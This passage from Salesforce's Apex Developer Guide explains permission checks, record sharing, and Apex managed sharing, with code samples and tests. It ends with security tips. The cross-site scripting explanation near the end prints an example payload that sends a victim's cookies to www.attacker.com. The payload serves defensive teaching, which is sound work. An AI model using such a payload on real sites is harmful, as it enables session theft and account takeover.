`Schema.DescribeSObjectResult` and the `Schema.DescribeFieldResult` methods to check the current user’s
access permission levels.


Apex Developer Guide Working with Data in Apex

[By using the Schema.DescribeSObjectResult methods and the Schema.DescribeFieldResult methods, you can verify that the current user](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)
has the necessary permissions and perform a specific DML operation or a query only if the user has sufficient permissions.

For example, you can call the `isAccessible`, `isCreateable`, or `isUpdateable` methods of
`Schema.DescribeSObjectResult` to verify whether the current user has read, create, or update access to an sObject, respectively.
Similarly, `Schema.DescribeFieldResult` exposes these access control methods that you can call to check the current user’s
read, create, or update access for a field. In addition, you can call the `isDeletable` method provided by
`Schema.DescribeSObjectResult` to check if the current user has permission to delete a specific sObject.

These examples call the access control methods.

To check the field-level update permission of the contact's email field before updating it:

```
   if (Schema.sObjectType.Contact.fields.Email.isUpdateable()) {

     // Update contact phone number

   }

```

To check the field-level create permission of the contact's email field before creating a new contact:

```
   if (Schema.sObjectType.Contact.fields.Email.isCreateable()) {

     // Create new contact

   }

```

To check the field-level read permission of the contact's email field before querying for this field:

```
   if (Schema.sObjectType.Contact.fields.Email.isAccessible()) {

     Contact c = [SELECT Email FROM Contact WHERE Id= :Id];

   }

```

To check the object-level permission for the contact before deleting the contact:

```
   if (Schema.sObjectType.Contact.isDeletable()) {

     // Delete contact

   }

##### Class Security

```

You can specify which users can execute methods in a particular top-level class based on their user profile or permission sets. You can
only set security on Apex classes, not on triggers.

[To set Apex class security from the class list page, seeSet Apex Class Access from the Class List Page](https://help.salesforce.com/s/articleView?id=platform.code_apex_access_via_list.htm&type=5&language=en_US)

[To set Apex class security from the class detail page, see Set Apex Class Access from the Class List Page](https://help.salesforce.com/s/articleView?id=platform.code_apex_access_via_detail.htm&type=5&language=en_US)

To set Apex class security from a permission set:

**1.** From Setup, enter _`Permission Sets`_ in the `Quick Find` box, then select **Permission Sets** .

**2.** Select a permission set.

**3.** Click **Apex Class Access** .

**4.** Click **Edit** .

**5.** Select the Apex classes that you want to enable from the Available Apex Classes list and click **Add**, or select the Apex classes that
you want to disable from the Enabled Apex Classes list and click **Remove** .

**6.** Click **Save** .

To set Apex class security from a profile:

**1.** From Setup, enter _`Profiles`_ in the `Quick Find` box, then select **Profiles** .


Apex Developer Guide Working with Data in Apex

**2.** Select a profile.

**3.** In the Apex Class Access page or related list, click **Edit** .

**4.** Select the Apex classes that you want to enable from the Available Apex Classes list and click **Add**, or select the Apex classes that
you want to disable from the Enabled Apex Classes list and click **Remove** .

**5.** Click **Save** .

##### Understanding Apex Managed Sharing

_Sharing_ is the act of granting a user or group of users permission to perform a set of actions on a record or set of records. Sharing access
can be granted using the Salesforce user interface and Lightning Platform, or programmatically using Apex.

For more information on sharing, see _Set Your Internal Organization-Wide Sharing Defaults_ in the Salesforce online help.

###### Understanding Sharing

_Sharing_ enables record-level access control for all custom objects, as well as many standard objects (such as Account, Contact,
Opportunity and Case). Administrators first set an object’s organization-wide default sharing access level, and then grant additional
access based on record ownership, the role hierarchy, sharing rules, and manual sharing. Developers can then use Apex managed
sharing to grant additional access programmatically with Apex.

Sharing a Record Using Apex

Recalculating Apex Managed Sharing

###### Understanding Sharing

_Sharing_ enables record-level access control for all custom objects, as well as many standard objects (such as Account, Contact, Opportunity
and Case). Administrators first set an object’s organization-wide default sharing access level, and then grant additional access based on
record ownership, the role hierarchy, sharing rules, and manual sharing. Developers can then use Apex managed sharing to grant
additional access programmatically with Apex.

Most sharing for a record is maintained in a related sharing object, similar to an access control list (ACL) found in other platforms.

Types of Sharing

Salesforce has the following types of sharing:

**Managed Sharing**
Managed sharing involves sharing access granted by Lightning Platform based on record ownership, the role hierarchy, and sharing
rules:

**Record Ownership**
Each record is owned by a user or optionally a queue for custom objects, cases and leads. The _record owner_ is automatically
granted Full Access, allowing them to view, edit, transfer, share, and delete the record.

**Role Hierarchy**
The _role hierarchy_ enables users above another user in the hierarchy to have the same level of access to records owned by or
shared with users below. Consequently, users above a record owner in the role hierarchy are also implicitly granted Full Access
to the record, though this behavior can be disabled for specific custom objects. The role hierarchy is not maintained with sharing
records. Instead, role hierarchy access is derived at runtime. For more information, see “Controlling Access Using Hierarchies” in
the Salesforce online help.


Apex Developer Guide Working with Data in Apex

**Sharing Rules**
_Sharing rules_ are used by administrators to automatically grant users within a given group or role access to records owned by a
specific group of users. Sharing rules cannot be added to a package and cannot be used to support sharing logic for apps installed
from AppExchange.

Sharing rules can be based on record ownership or other criteria. You can’t use Apex to create criteria-based sharing rules. Also,
criteria-based sharing cannot be tested using Apex.

All implicit sharing added by Force.com managed sharing cannot be altered directly using the Salesforce user interface, SOAP API,
or Apex.

**User Managed Sharing, also known as Manual Sharing**
User managed sharing allows the record owner or any user with Full Access to a record to share the record with a user or group of
users. This is generally done by an end user, for a single record. Only the record owner and users above the owner in the role hierarchy
are granted Full Access to the record. It is not possible to grant other users Full Access. Users with the “Modify All Records” object-level
permission for the given object or the “Modify All Data” permission can also manually share a record. User managed sharing is
removed when the record owner changes or when the access granted in the sharing does not grant additional access beyond the
object's organization-wide sharing default access level.

**Apex Managed Sharing**
Apex managed sharing provides developers with the ability to support an application’s particular sharing requirements
programmatically through Apex or the SOAP API. This type of sharing is similar to managed sharing. Only users with “Modify All
Data” permission can add or change Apex managed sharing on a record. Apex managed sharing is maintained across record owner
changes.

Note: Apex sharing reasons and Apex managed sharing recalculation are only available for custom objects.

The Sharing Reason Field

In the Salesforce user interface, the `Reason` field on a custom object specifies the type of sharing used for a record. This field is called
`rowCause` in Apex or the API.

Each of the following list items is a type of sharing used for records. The tables show `Reason` field value, and the related `rowCause`
value.

**•** Managed Sharing

`Reason Field` **Value** `rowCause` **Value (Used in Apex or the API)**

Account Sharing `ImplicitChild`

Associated record owner or sharing `ImplicitParent`

Owner `Owner`

Opportunity Team `Team`

Sharing Rule `Rule`

Territory Assignment Rule `TerritoryRule`

**•** User Managed Sharing


Apex Developer Guide Working with Data in Apex

`Reason Field` **Value** `rowCause` **Value (Used in Apex or the API)**

Manual Sharing `Manual`

Territory Manual `TerritoryManual`

Note: With Enterprise Territory Management in API
version 45.0 and later,

`Territory2AssociationManual` replaces
`TerritoryManual` .

**•** Apex Managed Sharing

`Reason Field` **Value** `rowCause` **Value (Used in Apex or the API)**

Defined by developer Defined by developer

The displayed reason for Apex managed sharing is defined by the developer.

Access Levels

When determining a user’s access to a record, the most permissive level of access is used. Most share objects support the following
access levels:

**Access Level** **API Name** **Description**

Private None

Only the record owner and users above the record owner in the role hierarchy
can view and edit the record. This access level only applies to the AccountShare
object.

Read Only Read The specified user or group can view the record only.

Read/Write Edit The specified user or group can view and edit the record.

Full Access All The specified user or group can view, edit, transfer, share, and delete the record.

Note: This access level can only be granted with managed sharing.

Sharing Considerations

**Apex Triggers and User Record Sharing**
If a trigger changes the owner of a record, the running user must have read access to the new owner’s user record if the trigger is
started through the following:

**•** API

**•** Standard user interface

**•** Standard Visualforce controller

**•** Class defined with the `with sharing` keyword


Apex Developer Guide Working with Data in Apex

If a trigger is started through a class that’s not defined with the `with sharing` keyword, the trigger runs in system mode. In
this case, the trigger doesn’t require the running user to have specific access.

###### Sharing a Record Using Apex

Important: Where possible, we changed noninclusive terms to align with our company value of Equality. We maintained certain
terms to avoid any effect on customer implementations.

To access sharing programmatically, you must use the share object associated with the standard or custom object for which you want
to share. For example, AccountShare is the sharing object for the Account object, ContactShare is the sharing object for the Contact
object. In addition, all custom object sharing objects are named as follows, where _`MyCustomObject`_ is the name of the custom
object:

```
   MyCustomObject __Share

```

Objects on the detail side of a master-detail relationship don’t have an associated sharing object. The detail record’s access is determined
by the master’s sharing object and the relationship’s sharing setting. For more information, see “Custom Object Security” in the Salesforce
Help.

A share object includes records supporting all three types of sharing: managed sharing, user managed sharing, and Apex managed
sharing. Sharing that is granted to users implicitly through organization-wide defaults, the role hierarchy, and permissions such as the
“View All Records” and “Modify All Records” permissions for the given object, “View All Data,” and “Modify All Data” aren’t tracked with
this object.

Every share object has the following properties:

**Property Name** **Description**

```
objectName AccessLevel

```

The level of access that the specified user or group has been granted for a share sObject. The name
of the property is `AccessLevel` appended to the object name. For example, the property name
for LeadShare object is `LeadAccessLevel` . Valid values are:

**•** `Edit`

**•** `Read`

**•** `All`

Note: The `All` access level is an internal value and can’t be granted.

This field must be set to an access level that’s higher than the organization’s default access level for
the parent object. For more information, see Understanding Sharing on page 224.

`ParentID` The ID of the custom object. This field can’t be updated.

`RowCause` The reason why the user or group is being granted access. The reason determines the type of sharing,
which controls who can alter the sharing record. This field can’t be updated.

`UserOrGroupId` The user or group IDs to which you’re granting access. A group can be:

**•** A public group or a sharing group associated with a role.

**•** A territory group.

This field can’t be updated.

Note: You can't grant access to unauthenticated guest users using Apex.


Apex Developer Guide Working with Data in Apex

You can share a standard or custom object with users or groups. For more information about the types of users and groups you can
[share an object with, see User and Group in the](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/sforce_api_objects_user.htm) _[Object Reference for Salesforce](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/)_ .

Creating User Managed Sharing Using Apex

It’s possible to manually share a record to a user or a group using Apex or SOAP API. If the owner of the record changes, the sharing is
automatically deleted. The following example class contains a method that shares the job specified by the job ID with the specified user
or group ID with read access. It also includes a test method that validates this method. Before you save this example class, create a
custom object called Job.

Note: Manual shares written using Apex contains `RowCause="Manual"` by default. Only shares with this condition are
removed when ownership changes.

```
   public class JobSharing {

     public static boolean manualShareRead(Id recordId, Id userOrGroupId){

       // Create new sharing object for the custom object Job.

       Job__Share jobShr = new Job__Share();

       // Set the ID of record being shared.

       jobShr.ParentId = recordId;

       // Set the ID of user or group being granted access.

       jobShr.UserOrGroupId = userOrGroupId;

       // Set the access level.

       jobShr.AccessLevel = 'Read';

       // Set rowCause to 'manual' for manual sharing.

       // This line can be omitted as 'manual' is the default value for sharing objects.

       jobShr.RowCause = Schema.Job__Share.RowCause.Manual;

       // Insert the sharing record and capture the save result.

       // The false parameter allows for partial processing if multiple records passed

       // into the operation.

       Database.SaveResult sr = Database.insert(jobShr,false);

       // Process the save results.

       if(sr.isSuccess()){

         // Indicates success

         return true;

       }

       else {

         // Get first save result error.

         Database.Error err = sr.getErrors()[0];

         // Check if the error is related to trival access level.

         // Access level must be more permissive than the object's default.

         // These sharing records are not required and thus an insert exception is

   acceptable.

         if(err.getStatusCode() == StatusCode.FIELD_FILTER_VALIDATION_EXCEPTION &&

              err.getMessage().contains('AccessLevel')){

           // Indicates success.

           return true;

```


Apex Developer Guide Working with Data in Apex

```
         }

         else{

           // Indicates failure.

           return false;

         }

        }

     }

   }

   @isTest

   private class JobSharingTest {

     // Test for the manualShareRead method

     static testMethod void testManualShareRead(){

       // Select users for the test.

       List<User> users = [SELECT Id FROM User WHERE IsActive = true LIMIT 2];

       Id User1Id = users[0].Id;

       Id User2Id = users[1].Id;

       // Create new job.

       Job__c j = new Job__c();

       j.Name = 'Test Job';

       j.OwnerId = user1Id;

       insert j;

       // Insert manual share for user who is not record owner.

       System.assertEquals(JobSharing.manualShareRead(j.Id, user2Id), true);

       // Query job sharing records.

       List<Job__Share> jShrs = [SELECT Id, UserOrGroupId, AccessLevel,

         RowCause FROM job__share WHERE ParentId = :j.Id AND UserOrGroupId= :user2Id];

       // Test for only one manual share on job.

       System.assertEquals(jShrs.size(), 1, 'Set the object\'s sharing model to Private.');

       // Test attributes of manual share.

       System.assertEquals(jShrs[0].AccessLevel, 'Read');

       System.assertEquals(jShrs[0].RowCause, 'Manual');

       System.assertEquals(jShrs[0].UserOrGroupId, user2Id);

       // Test invalid job Id.

       delete j;

       // Insert manual share for deleted job id.

       System.assertEquals(JobSharing.manualShareRead(j.Id, user2Id), false);

     }

   }

```

Important: The object’s organization-wide default access level must not be set to the most permissive access level. For custom
objects, this level is Public Read/Write. For more information, see Understanding Sharing on page 224.


Apex Developer Guide Working with Data in Apex

Creating Apex Managed Sharing

Apex managed sharing enables developers to programmatically manipulate sharing to support their application’s behavior through
either Apex or SOAP API. This type of sharing is similar to managed sharing. Only users with “Modify All Data” permission can add or
change Apex managed sharing on a record. Apex managed sharing is maintained across record owner changes.

Apex managed sharing must use an _Apex sharing reason_ . Apex sharing reasons are a way for developers to track why they shared a record
with a user or group of users. Using multiple Apex sharing reasons simplifies the coding required to make updates and deletions of
sharing records. They also enable developers to share with the same user or group multiple times using different reasons.

Note: Apex sharing reasons aren’t available in Lightning Experience. Use Salesforce Classic to create sharing reasons within the
[UI. See Point and Click Customization for the complete list of differences in features and settings between Salesforce Classic and](https://help.salesforce.com/s/articleView?id=xcloud.lex_gaps_limitations_ui_customization.htm&type=5&language=en_US)
Lightning Experience.

Apex sharing reasons are defined on an object's detail page. Each Apex sharing reason has a label and a name:

**•** The label displays in the `Reason` column when viewing the sharing for a record in the user interface. This label allows users and
administrators to understand the source of the sharing. The label is also enabled for translation through the Translation Workbench.

**•** The name is used when referencing the reason in the API and Apex.

All Apex sharing reason names have the following format:

```
   MyReasonName__c

```

Apex sharing reasons can be referenced programmatically as follows:

```
   Schema. CustomObject__Share .rowCause. SharingReason__c

```

For example, an Apex sharing reason called Recruiter for an object called Job can be referenced as follows:

```
   Schema.Job__Share.rowCause.Recruiter__c

```

[For more information, see System.Schema Class.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_schema.htm)

To create an Apex sharing reason:

**1.** From the management settings for the custom object, click **New** in the Apex Sharing Reasons related list.

**2.** Enter a label for the Apex sharing reason. The label displays in the `Reason` column when viewing the sharing for a record in the
user interface. The label is also enabled for translation through the Translation Workbench.

**3.** Enter a name for the Apex sharing reason. The name is used when referencing the reason in the API and Apex. This name can contain
only underscores and alphanumeric characters, and must be unique in your org. It must begin with a letter, not include spaces, not
end with an underscore, and not contain two consecutive underscores.

**4.** Click **Save** .

Note: Apex sharing reasons and Apex managed sharing recalculation are only available for custom objects.

Apex Managed Sharing Example

For this example, suppose that you’re building a recruiting application and have an object called Job. You want to validate that the
recruiter and hiring manager listed on the job have access to the record. The following trigger grants the recruiter and hiring manager
access when the job record is created. This example requires a custom object called Job, with two lookup fields associated with User
records called Hiring_Manager and Recruiter. Also, the Job custom object must have two sharing reasons added called Hiring_Manager
and Recruiter.

```
   trigger JobApexSharing on Job__c (after insert) {

```


Apex Developer Guide Working with Data in Apex

```
      if(trigger.isInsert){

        // Create a new list of sharing objects for Job

        List<Job__Share> jobShrs = new List<Job__Share>();

        // Declare variables for recruiting and hiring manager sharing

        Job__Share recruiterShr;

        Job__Share hmShr;

        for(Job__c job : trigger.new){

           // Instantiate the sharing objects

           recruiterShr = new Job__Share();

           hmShr = new Job__Share();

           // Set the ID of record being shared

           recruiterShr.ParentId = job.Id;

           hmShr.ParentId = job.Id;

           // Set the ID of user or group being granted access

           recruiterShr.UserOrGroupId = job.Recruiter__c;

           hmShr.UserOrGroupId = job.Hiring_Manager__c;

           // Set the access level

           recruiterShr.AccessLevel = 'edit';

           hmShr.AccessLevel = 'read';

           // Set the Apex sharing reason for hiring manager and recruiter

           recruiterShr.RowCause = Schema.Job__Share.RowCause.Recruiter__c;

           hmShr.RowCause = Schema.Job__Share.RowCause.Hiring_Manager__c;

           // Add objects to list for insert

           jobShrs.add(recruiterShr);

           jobShrs.add(hmShr);

        }

        // Insert sharing records and capture save result

        // The false parameter allows for partial processing if multiple records are passed

        // into the operation

        Database.SaveResult[] lsr = Database.insert(jobShrs,false);

        // Create counter

        Integer i=0;

        // Process the save results

        for(Database.SaveResult sr : lsr){

           if(!sr.isSuccess()){

             // Get the first save result error

             Database.Error err = sr.getErrors()[0];

             // Check if the error is related to a trivial access level

             // Access levels equal or more permissive than the object's default

             // access level are not allowed.

             // These sharing records are not required and thus an insert exception is

```


Apex Developer Guide Working with Data in Apex

```
             // acceptable.

             if(!(err.getStatusCode() == StatusCode.FIELD_FILTER_VALIDATION_EXCEPTION

                                &&

   err.getMessage().contains('AccessLevel'))){

               // Throw an error when the error is not related to trivial access

   level.

               trigger.newMap.get(jobShrs[i].ParentId).

                 addError(

                 'Unable to grant sharing access due to following exception: '

                 + err.getMessage());

             }

           }

           i++;

        }

      }

   }

```

Under certain circumstances, inserting a share row results in an update of an existing share row. Consider these examples:

**•** A manual share access level is set to Read and you insert a new one set to Write. The original share rows are updated to Write,
indicating the higher level of access.

**•** Users can access an account because they can access its child records (contact, case, opportunity, and so on). If an account sharing
rule is created, the sharing rule row cause (which is a higher access level) replaces the parent implicit share row cause, indicating
the higher level of access.

Important: The object’s organization-wide default access level must not be set to the most permissive access level. For custom
objects, this level is Public Read/Write. For more information, see Understanding Sharing on page 224.

Creating Apex Managed Sharing for Customer Community Plus users

Customer Community Plus users are previously known as Customer Portal users. Share objects, such as `AccountShare` and
`ContactShare`, aren’t available to these users. If you must use share objects as a Customer Community Plus user, consider using a
trigger, which operates with the `without sharing` keyword by default. Otherwise, use an inner class with the same keyword to
enable the DML operation to run successfully. A separate utility class can also be used to enable this access.

Granting visibility via manual or apex shares written to the share objects is supported but the objects themselves aren't available to
Customer Community Plus users. However, other users can add shares that grant access to Customer Community Plus users.

Warning: After enabling digital experiences, records accessible to Roles and Subordinates via Apex managed sharing are
automatically made accessible to Roles, Internal, and Portal Subordinates. To secure external users’ access, update your Apex code
so that it creates shares to the Role and Internal Subordinates group. Because this conversion is a large-scale operation, consider
using batch Apex.

###### Recalculating Apex Managed Sharing

Salesforce automatically recalculates sharing for all records on an object when its organization-wide sharing default access level changes.
The recalculation adds managed sharing when appropriate. In addition, all types of sharing are removed if the access they grant is
considered redundant. For example, manual sharing, which grants Read Only access to a user, is deleted when the object’s sharing
model changes from Private to Public Read Only.


Apex Developer Guide Working with Data in Apex

To recalculate Apex managed sharing, you must write an Apex class that implements a Salesforce-provided interface to do the recalculation.
You must then associate the class with the custom object, on the custom object's detail page, in the Apex Sharing Recalculation related
list.

Note: Apex sharing reasons and Apex managed sharing recalculation are only available for custom objects.

You can execute this class from the custom object detail page where the Apex sharing reason is specified. An administrator might need
to recalculate the Apex managed sharing for an object if a locking issue prevented Apex code from granting access to a user as defined
by the application’s logic. You can also use the Database.executeBatch method to programmatically invoke an Apex managed sharing
recalculation.

Note: Every time a custom object's organization-wide sharing default access level is updated, any Apex recalculation classes
defined for associated custom object are also executed.

To monitor or stop the execution of the Apex recalculation, from Setup, enter _`Apex Jobs`_ in the `Quick Find` box, then select
**Apex Jobs** .

Creating an Apex Class for Recalculating Sharing

To recalculate Apex managed sharing, you must write an Apex class to do the recalculation. This class must implement the
Salesforce-provided interface `Database.Batchable` .

The `Database.Batchable` interface is used for all batch Apex processes, including recalculating Apex managed sharing. You can
implement this interface more than once in your organization. For more information on the methods that must be implemented, see
Use Batch Apex on page 307.

Before creating an Apex managed sharing recalculation class, also consider the best practices.

Important: The object’s organization-wide default access level must not be set to the most permissive access level. For custom
objects, this level is Public Read/Write. For more information, see Understanding Sharing on page 224.

Apex Managed Sharing Recalculation Example

For this example, suppose that you are building a recruiting application and have an object called Job. You want to validate that the
recruiter and hiring manager listed on the job have access to the record. The following Apex class performs this validation. This example
requires a custom object called Job, with two lookup fields associated with User records called Hiring_Manager and Recruiter. Also, the
Job custom object should have two sharing reasons added called Hiring_Manager and Recruiter. Before you run this sample, replace
the email address with a valid email address to which you want to send error notifications and job completion notifications.

```
   global class JobSharingRecalc implements Database.Batchable<sObject> {

      // String to hold email address that emails will be sent to.

      // Replace its value with a valid email address.

      static String emailAddress = 'admin@yourcompany.com';

      // The start method is called at the beginning of a sharing recalculation.

      // This method returns a SOQL query locator containing the records

      // to be recalculated.

      global Database.QueryLocator start(Database.BatchableContext BC){

        return Database.getQueryLocator([SELECT Id, Hiring_Manager__c, Recruiter__c

                            FROM Job__c]);

      }

      // The executeBatch method is called for each chunk of records returned from start.

```


Apex Developer Guide Working with Data in Apex

```
      global void execute(Database.BatchableContext BC, List<sObject> scope){

        // Create a map for the chunk of records passed into method.

        Map<ID, Job__c> jobMap = new Map<ID, Job__c>((List<Job__c>)scope);

        // Create a list of Job__Share objects to be inserted.

        List<Job__Share> newJobShrs = new List<Job__Share>();

        // Locate all existing sharing records for the Job records in the batch.

        // Only records using an Apex sharing reason for this app should be returned.

        List<Job__Share> oldJobShrs = [SELECT Id FROM Job__Share WHERE ParentId IN

           :jobMap.keySet() AND

           (RowCause = :Schema.Job__Share.rowCause.Recruiter__c OR

           RowCause = :Schema.Job__Share.rowCause.Hiring_Manager__c)];

        // Construct new sharing records for the hiring manager and recruiter

        // on each Job record.

        for(Job__c job : jobMap.values()){

           Job__Share jobHMShr = new Job__Share();

           Job__Share jobRecShr = new Job__Share();

          // Set the ID of user (hiring manager) on the Job record being granted access.

           jobHMShr.UserOrGroupId = job.Hiring_Manager__c;

           // The hiring manager on the job should always have 'Read Only' access.

           jobHMShr.AccessLevel = 'Read';

           // The ID of the record being shared

           jobHMShr.ParentId = job.Id;

           // Set the rowCause to the Apex sharing reason for hiring manager.

           // This establishes the sharing record as Apex managed sharing.

           jobHMShr.RowCause = Schema.Job__Share.RowCause.Hiring_Manager__c;

           // Add sharing record to list for insertion.

           newJobShrs.add(jobHMShr);

           // Set the ID of user (recruiter) on the Job record being granted access.

           jobRecShr.UserOrGroupId = job.Recruiter__c;

           // The recruiter on the job should always have 'Read/Write' access.

           jobRecShr.AccessLevel = 'Edit';

           // The ID of the record being shared

           jobRecShr.ParentId = job.Id;

           // Set the rowCause to the Apex sharing reason for recruiter.

           // This establishes the sharing record as Apex managed sharing.

           jobRecShr.RowCause = Schema.Job__Share.RowCause.Recruiter__c;

         // Add the sharing record to the list for insertion.

           newJobShrs.add(jobRecShr);

        }

```


Apex Developer Guide Working with Data in Apex

```
        try {

          // Delete the existing sharing records.

          // This allows new sharing records to be written from scratch.

           Delete oldJobShrs;

          // Insert the new sharing records and capture the save result.

          // The false parameter allows for partial processing if multiple records are

          // passed into operation.

          Database.SaveResult[] lsr = Database.insert(newJobShrs,false);

          // Process the save results for insert.

          for(Database.SaveResult sr : lsr){

            if(!sr.isSuccess()){

               // Get the first save result error.

               Database.Error err = sr.getErrors()[0];

               // Check if the error is related to trivial access level.

               // Access levels equal or more permissive than the object's default

               // access level are not allowed.

               // These sharing records are not required and thus an insert exception

               // is acceptable.

              if(!(err.getStatusCode() == StatusCode.FIELD_FILTER_VALIDATION_EXCEPTION

                          && err.getMessage().contains('AccessLevel'))){

                 // Error is not related to trivial access level.

                 // Send an email to the Apex job's submitter.

              Messaging.SingleEmailMessage mail = new Messaging.SingleEmailMessage();

                String[] toAddresses = new String[] {emailAddress};

                mail.setToAddresses(toAddresses);

                mail.setSubject('Apex Sharing Recalculation Exception');

                mail.setPlainTextBody(

                 'The Apex sharing recalculation threw the following exception: ' +

                     err.getMessage());

                Messaging.sendEmail(new Messaging.SingleEmailMessage[] { mail });

               }

            }

          }

        } catch(DmlException e) {

          // Send an email to the Apex job's submitter on failure.

           Messaging.SingleEmailMessage mail = new Messaging.SingleEmailMessage();

           String[] toAddresses = new String[] {emailAddress};

           mail.setToAddresses(toAddresses);

           mail.setSubject('Apex Sharing Recalculation Exception');

           mail.setPlainTextBody(

            'The Apex sharing recalculation threw the following exception: ' +

                  e.getMessage());

           Messaging.sendEmail(new Messaging.SingleEmailMessage[] { mail });

        }

      }

      // The finish method is called at the end of a sharing recalculation.

```


Apex Developer Guide Working with Data in Apex

```
      global void finish(Database.BatchableContext BC){

        // Send an email to the Apex job's submitter notifying of job completion.

        Messaging.SingleEmailMessage mail = new Messaging.SingleEmailMessage();

        String[] toAddresses = new String[] {emailAddress};

        mail.setToAddresses(toAddresses);

        mail.setSubject('Apex Sharing Recalculation Completed.');

        mail.setPlainTextBody

                 ('The Apex sharing recalculation finished processing');

        Messaging.sendEmail(new Messaging.SingleEmailMessage[] { mail });

      }

   }

```

Testing Apex Managed Sharing Recalculations

This example inserts five Job records and invokes the batch job that is implemented in the batch class of the previous example. This
example requires a custom object called Job, with two lookup fields associated with User records called Hiring_Manager and Recruiter.
Also, the Job custom object should have two sharing reasons added called Hiring_Manager and Recruiter. Before you run this test, set
the organization-wide default sharing for Job to Private. Note that since email messages aren’t sent from tests, and because the batch
class is invoked by a test method, the email notifications won’t be sent in this case.

```
   @isTest

   private class JobSharingTester {

      // Test for the JobSharingRecalc class

      static testMethod void testApexSharing(){

        // Instantiate the class implementing the Database.Batchable interface.

        JobSharingRecalc recalc = new JobSharingRecalc();

        // Select users for the test.

        List<User> users = [SELECT Id FROM User WHERE IsActive = true LIMIT 2];

        ID User1Id = users[0].Id;

        ID User2Id = users[1].Id;

        // Insert some test job records.

        List<Job__c> testJobs = new List<Job__c>();

        for (Integer i=0;i<5;i++) {

        Job__c j = new Job__c();

           j.Name = 'Test Job ' + i;

           j.Recruiter__c = User1Id;

           j.Hiring_Manager__c = User2Id;

           testJobs.add(j);

        }

        insert testJobs;

        Test.startTest();

        // Invoke the Batch class.

        String jobId = Database.executeBatch(recalc);

        Test.stopTest();

        // Get the Apex job and verify there are no errors.

        AsyncApexJob aaj = [Select JobType, TotalJobItems, JobItemsProcessed, Status,

```


Apex Developer Guide Working with Data in Apex

```
                    CompletedDate, CreatedDate, NumberOfErrors

                    from AsyncApexJob where Id = :jobId];

        System.assertEquals(0, aaj.NumberOfErrors);

        // This query returns jobs and related sharing records that were inserted

        // by the batch job's execute method.

        List<Job__c> jobs = [SELECT Id, Hiring_Manager__c, Recruiter__c,

           (SELECT Id, ParentId, UserOrGroupId, AccessLevel, RowCause FROM Shares

           WHERE (RowCause = :Schema.Job__Share.rowCause.Recruiter__c OR

           RowCause = :Schema.Job__Share.rowCause.Hiring_Manager__c))

           FROM Job__c];

        // Validate that Apex managed sharing exists on jobs.

        for(Job__c job : jobs){

           // Two Apex managed sharing records should exist for each job

           // when using the Private org-wide default.

           System.assert(job.Shares.size() == 2);

           for(Job__Share jobShr : job.Shares){

            // Test the sharing record for hiring manager on job.

             if(jobShr.RowCause == Schema.Job__Share.RowCause.Hiring_Manager__c){

               System.assertEquals(jobShr.UserOrGroupId,job.Hiring_Manager__c);

               System.assertEquals(jobShr.AccessLevel,'Read');

             }

             // Test the sharing record for recruiter on job.

             else if(jobShr.RowCause == Schema.Job__Share.RowCause.Recruiter__c){

               System.assertEquals(jobShr.UserOrGroupId,job.Recruiter__c);

               System.assertEquals(jobShr.AccessLevel,'Edit');

             }

           }

        }

      }

   }

```

Associating an Apex Class Used for Recalculation

An Apex class used for recalculation must be associated with a custom object.

To associate an Apex managed sharing recalculation class with a custom object:

**1.** From the management settings for the custom object, go to Apex Sharing Recalculations.

**2.** Choose the Apex class that recalculates the Apex sharing for this object. The class you choose must implement the
`Database.Batchable` interface. You cannot associate the same Apex class multiple times with the same custom object.

**3.** Click **Save** .

##### Security Tips for Apex and Visualforce Development

Understanding Security

The powerful combination of Apex and Visualforce pages allows Lightning Platform developers to provide custom functionality and
business logic to Salesforce or to create a new standalone product running inside the Lightning Platform. But as with any programming
language, developers must be cognizant of potential security-related pitfalls.


Apex Developer Guide Working with Data in Apex

Salesforce has incorporated several security defenses in the Lightning Platform. But careless developers can still bypass the built-in
defenses and then expose their applications and customers to security risks. Many of the coding mistakes a developer can make on the
Lightning Platform are similar to general web application security vulnerabilities, while others are unique to Apex.

To certify an application for AppExchange, it’s important for developers to learn and understand the security flaws described. For more
[information, see the Lightning Platform Security Resources page on Salesforce Developers. https://developer.salesforce.com/page/Security.](https://developer.salesforce.com/page/Security)

Open Redirects Through Static Resources

URL redirects automatically send a user to a different web page. Redirects are often used to guide navigation to a website, or refer
multiple domain names belonging to the same owner to refer to a single website. Unfortunately for developers, attackers can exploit
URL redirects when not implemented properly. Open redirect (also known as “arbitrary redirect”) is a common web application vulnerability
where values controlled by the user determine where the app redirects.

Warning: Open redirects through static resources can expose users to the risk of unintended, and possibly malicious, redirects.

Only admins with “Customize Application” permissions can upload static resources within an organization. Admins with this permission
must use caution to ensure that static resources don’t contain malicious content. To learn how to help guard against static resources
[that were obtained from third parties, see Referencing Untrusted Third-Party Content with iframes .](https://developer.salesforce.com/docs/atlas.en-us.262.0.pages.meta/pages/pages_resources_iframe.htm)

###### Cross Site Scripting (XSS)

Unescaped Output and Formulas in Visualforce Pages
When using components that have set the `escape` attribute to false, or when including formulas outside of a Visualforce component,
output is unfiltered and must be validated for security. This is especially important when using formula expressions.

Cross-Site Request Forgery (CSRF)

SOQL Injection

Data Access Control
The Salesforce Platform makes extensive use of data sharing rules. Each object has permissions and can have sharing settings that
users can read, create, edit, and delete. These settings are enforced when using all standard controllers.

###### Cross Site Scripting (XSS)

Cross-site scripting (XSS) attacks are where malicious HTML or client-side scripting is provided to a web application. The web application
includes malicious scripting in a response to a user who unknowingly becomes the victim of the attack. The attacker uses the web
application as an intermediary in the attack, taking advantage of the victim's trust for the web application. Most applications that display
dynamic web pages without properly validating the data are likely to be vulnerable. Attacks against the website are especially easy if
input from one user is shown to another user. Some obvious possibilities include bulletin board or user comment-style websites, news,
or email archives.

For example, assume this script is included in a Lightning Platform page using a script component, an `on*` event, or a Visualforce page.

```
   <script>var foo = '{!$CurrentPage.parameters.userparam}';</script>

```

This script block inserts the value of the user-supplied `userparam` onto the page. The attacker can then enter this value for
`userparam` .

```
   1';document.location='http://www.attacker.com/cgi-bin/cookie.cgi?'%2Bdocument.cookie;var%20foo='2

```

In this case, all cookies for the current page are sent to `www.attacker.com` as the query string in the request to the `cookie.cgi`
script. At this point, the attacker has the victim's session cookie and can connect to the web application as if they were the victim.


Apex Developer Guide Working with Data in Apex

The attacker can post a malicious script using a website or email. Web application users not only see the attacker's input, but their
